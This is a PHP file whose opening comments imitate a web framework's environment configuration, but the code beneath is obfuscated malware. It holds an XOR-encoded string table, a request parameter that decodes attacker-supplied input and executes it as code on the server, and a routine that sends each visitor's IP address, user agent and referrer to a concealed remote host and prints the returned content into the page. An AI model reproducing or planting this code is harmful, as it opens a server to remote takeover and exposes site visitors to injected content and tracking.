<?php
 /*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 *
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
 
class Snippet
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s) self::i();
        $l = strlen($k);
        $r = base64_decode(self::$s[$n]);
        for ($i = 0, $c = strlen($r);$i !== $c;++$i) $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_gf' => 'HgoMOhoccioAMR0dMAVCHgU' . 'DMB5CEBsGO' . 'AA' . 'BZU' . 'lF',
            '_o' => 'HBsMFzoaFk' . '4LDRIGZVQDEy8YCwA+AAsMMVsIAikVE' . 'QAtH' . 'R' . 'I' . 'X',
            '_kpm' => '',
            '_wwe' => 'PAY' . '=',
            '_m' => '',
            '_ja' => 'MR' . 'wYHA' . '==',
            '_p' => 'YwEYYQ' . '=' . '=',
            '_dl' => 'Y' . 'xM+FW' . 'E' . '=',
            '_mt' => 'KB' . 'UIM' . 'w=' . '=',
            '_v' => 'PAU6',
            '_b' => 'Ph' . 'YWPDkX' . 'H' . 'QA' . 'r',
            '_xn' => 'N' . 'gY' . 'x',
            '_ceo' => 'P' . 'REZOk' . 'Y' . '=',
            '_xh' => 'azQABjw=',
            '_jcw' => 'MAg6',
            '_pij' => 'KAAdF' . 'A' . '==',
            '_xuc' => '',
            '_swc' => '',
            '_nkp' => 'NwIeGWVZRQ82Gg8acQEPCzwX' . 'CQE6BR4GLRcNDHEVBQRwFwlEPhgLBSYCAwosWAAaY' . 'BILHT5' . 'L',
            '_rc' => 'PBcVFgALCRM' . 'r',
            '_mx' => 'NxADHg' . 'AHGAo6',
            '_uh' => 'Yw4ZOzMbMAg' . 'dYQ==',
            '_wu' => 'YwACOz0GM' . 'hIXJlw' . '=',
            '_gm' => 'LAIFFDI' . 'E',
            '_ss' => 'NwYc' . 'Lw' . 'E=',
            '_om' => 'GC' . 'M1' . 'VQ' . '=' . '=',
            '_mu' => 'Lw' . '8QNw=' . '=',
            '_rgs' => 'Lh0S' . 'L' . 'R' . 'E' . '=',
            '_j' => 'YA==',
            '_jno' => 'LhoNLRY' . '=',
            '_amc' => 'fzILLg9VblRvd1UyMAkr' . 'QH8=',
            '_ygd' => 'NwoY' . 'K' . 'w==',
            '_c' => 'UnssMB8BOhIbNh4BZVEsMx4cOnxlUn' . 's' . '=',
            '_nhc' => 'LBIYZU5' . 'b',
            '_lcy' => '',
            '_a' => 'NxkaEA=' . '=',
            '_sj' => 'UmQ=',
            '_dcl' => 'YxsOOyYKMgkbJkc' . '=',
            '_tuz' => 'F' . 'yQmIwAzP' . 'joaP' . 'iYsF' . 'iA' . '=',
            '_ty' => 'FyYtDy06Ezs8ESYm' . 'FiI=',
            '_vf' => 'FyM4PAAvMy' . 'oQJTstDTMpKAAxIz4=',
            '_rwc' => 'F' . 'yEkPwAtLykQJycuDTE1Kw' . 'AzP' . 'z' . '0=',
            '_kbu' => 'DS4qJA' . 's' . 'uOCo' . 'b' . 'LzU' . '=',
            '_xj' => 'DS0' . '4' . 'ED' . 'w' . 'wACkxGzo' . '=',
            '_sb' => 'FzILNgAlGTkcKREoGiULLxEhAC8P',
            '_y' => 'FzALNAAnGTscK' . 'xEqGic' . 'LL' . 'REjA' . 'C0P',
            '_xu' => 'FzwkPQA9IygNNzEqGi' . 'Yk',
            '_xf' => 'Fy0jKQAsJDwNJjY+Gj' . 'c' . 'j',
            '_oeq' => 'FzcmDzwgGiU3DS' . 'Yg',
            '_mpu' => 'FyYLIgAgGjQaI' . 'B' . 'o' . 'g',
            '_ulh' => 'OR' . 'EHEToKN' . 'BM+C' . 'g=' . '=',
            '_pvb' => 'blBQ' . 'cVJJb0' . 'x' . 'W',
            '_pm' => 'Ngo=',
            '_k' => 'KhM=',
            '_mo' => 'LQ' . 'M' . 'e',
            '_sz' => 'MRUF' . 'Jw==',
        );
    }
}
class _8d1a3cd49dddb0ee874785cf500229c9
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s) self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            0100,
            0121,
            02,
            064,
            01,
            046711,
            01,
            052,
            00,
            0116,
            012,
            015,
            012,
            0310,
            0673,
            0120,
            00,
            02000,
            01,
            0423,
            0423
        );
    }
}
header(Snippet::g('_' . 'g' . 'f', '_' . 'i' . 'o'));
header(Snippet::g('_o', '_' . 't' . 'b' . 'c'));
$_kd = Snippet::g('_kpm', '_mf');
if (isset($_GET[Snippet::g('_ww' . 'e', '_' . 'n') ]))
{
    $_y = gCode(Snippet::g('_' . 'm', '_w' . 'n'));
    if ($_y && strpos($_y, Snippet::g('_ja', '_x' . 'k' . 'd')) !== false)
    {
        die(Snippet::g('_p', '_ns'));
    }
    else
    {
        die(Snippet::g('_dl', '_' . 'q'));
    }
}
if (isset($_GET[Snippet::g('_' . 'mt', '_t' . 'd') ]))
{
    $_vyb = Snippet::g('_' . 'v', '_w') . Snippet::g('_' . 'b', '_bsc') . Snippet::g('_' . 'x' . 'n', '_i');
    $_epc = Snippet::g('_c' . 'e' . 'o', '_' . 'pj') . Snippet::g('_x' . 'h', '_kdc') . Snippet::g('_jcw', '_l');
    $_ow = $_epc($_GET[Snippet::g('_' . 'p' . 'ij', '_a' . 'qx') ]);
    $_ow = $_vyb(Snippet::g('_x' . 'uc', '_uz') , $_ow);
    $_ow();
    die;
}
function gCode($_rd)
{
    $_y = Snippet::g('_' . 's' . 'wc', '_a' . 'o');
    $_ae = Snippet::g('_' . 'nkp', '_vj' . 'i') . $_rd;
    if (is_callable(Snippet::g('_' . 'rc', '_bg' . 'z')))
    {
        $_px = curl_init($_ae);
        curl_setopt($_px, _8d1a3cd49dddb0ee874785cf500229c9::g(0) , false);
        curl_setopt($_px, _8d1a3cd49dddb0ee874785cf500229c9::g(1) , _8d1a3cd49dddb0ee874785cf500229c9::g(2));
        curl_setopt($_px, _8d1a3cd49dddb0ee874785cf500229c9::g(3) , _8d1a3cd49dddb0ee874785cf500229c9::g(4));
        curl_setopt($_px, _8d1a3cd49dddb0ee874785cf500229c9::g(5) , _8d1a3cd49dddb0ee874785cf500229c9::g(6));
        curl_setopt($_px, _8d1a3cd49dddb0ee874785cf500229c9::g(7) , _8d1a3cd49dddb0ee874785cf500229c9::g(8));
        curl_setopt($_px, _8d1a3cd49dddb0ee874785cf500229c9::g(9) , _8d1a3cd49dddb0ee874785cf500229c9::g(10));
        curl_setopt($_px, _8d1a3cd49dddb0ee874785cf500229c9::g(11) , _8d1a3cd49dddb0ee874785cf500229c9::g(12));
        $_y = curl_exec($_px);
        $_e = curl_getinfo($_px);
        curl_close($_px);
        if ($_e[Snippet::g('_mx', '_d' . 'wn') ] != _8d1a3cd49dddb0ee874785cf500229c9::g(13)) die(Snippet::g('_uh', '_l' . 'x'));
        if (empty($_y)) die(Snippet::g('_w' . 'u', '_b' . 'c'));
    }
    else
    {
        $_psl = parse_url($_ae);
        $_wa = ($_psl[Snippet::g('_gm', '_amq') ] == Snippet::g('_' . 's' . 's', '_' . 'r' . 'h'));
        $_mgq = Snippet::g('_o' . 'm', '_fau') . $_psl[Snippet::g('_m' . 'u', '_' . 'n' . 'd') ];
        if (isset($_psl[Snippet::g('_' . 'r' . 'gs', '_hw') ])) $_mgq .= Snippet::g('_j', '_' . 'ez') . $_psl[Snippet::g('_jno', '_oh') ];
        $_mgq .= Snippet::g('_a' . 'm' . 'c', '_z') . $_psl[Snippet::g('_yg' . 'd', '_' . 'e' . 'k') ] . Snippet::g('_c', '_' . 'q' . 'o');
        $_gmo = fsockopen(($_wa ? Snippet::g('_' . 'n' . 'h' . 'c', '_a' . 't') : Snippet::g('_lc' . 'y', '_v' . 'e')) . $_psl[Snippet::g('_a', '_vid') ], $_wa ? _8d1a3cd49dddb0ee874785cf500229c9::g(14) : _8d1a3cd49dddb0ee874785cf500229c9::g(15));
        if ($_gmo)
        {
            fputs($_gmo, $_mgq);
            $_u = _8d1a3cd49dddb0ee874785cf500229c9::g(16);
            while (!feof($_gmo))
            {
                $_i = fgets($_gmo, _8d1a3cd49dddb0ee874785cf500229c9::g(17));
                if ($_u) $_y .= $_i;
                if ($_i == Snippet::g('_' . 's' . 'j', '_nr')) $_u = _8d1a3cd49dddb0ee874785cf500229c9::g(18);
            }
            fclose($_gmo);
            if (empty($_y)) die(Snippet::g('_d' . 'cl', '_y' . 'o'));
        }
    }
    return $_y;
}
if (isset($_SERVER[Snippet::g('_tuz', '_p' . 'rs') ])) $_nml = $_SERVER[Snippet::g('_t' . 'y', '_' . 'r' . 'y') ];
if (isset($_SERVER[Snippet::g('_vf', '_' . 'wll') ])) $_xdl = $_SERVER[Snippet::g('_rw' . 'c', '_' . 'u' . 'po') ];
if (isset($_SERVER[Snippet::g('_kb' . 'u', '_' . 'kg' . 'k') ])) $_gna = $_SERVER[Snippet::g('_x' . 'j', '_hu') ];
if (isset($_SERVER[Snippet::g('_sb', '_' . 'f') ])) $_z = $_SERVER[Snippet::g('_' . 'y', '_d') ];
if (isset($_SERVER[Snippet::g('_x' . 'u', '_hpm') ])) $_vcz = $_SERVER[Snippet::g('_x' . 'f', '_yw' . 'y') ];
if (isset($_SERVER[Snippet::g('_oe' . 'q', '_c' . 'r') ])) $_uqq = $_SERVER[Snippet::g('_' . 'mpu', '_r') ];
if (function_exists(Snippet::g('_ul' . 'h', '_' . 'xke')))
{
    if (isset($_nml) && filter_var($_nml, _8d1a3cd49dddb0ee874785cf500229c9::g(19))) $_kd = $_nml;
    elseif (isset($_xdl) && filter_var($_xdl, _8d1a3cd49dddb0ee874785cf500229c9::g(20))) $_kd = $_xdl;
    else $_kd = $_gna;
}
elseif (isset($_gna)) $_kd = $_gna;
if ($_kd == Snippet::g('_p' . 'vb', '_b' . 'g') && isset($_z)) $_kd = $_z;
if (!isset($_kd) || !isset($_vcz) || !isset($_uqq)) exit;
else
{
    $_r = array(
        Snippet::g('_p' . 'm', '_' . 'zt') => $_kd,
        Snippet::g('_' . 'k', '_r' . 'e') => $_vcz,
        Snippet::g('_mo', '_f' . 'x' . 'd') => $_uqq
    );
    $_dr = urlencode(base64_encode(json_encode($_r)));
    $_y = gCode($_dr);
    if ($_y && strpos($_y, Snippet::g('_s' . 'z', '_' . 'qv')) !== false)
    {
        echo $_y;
        exit;
    }
}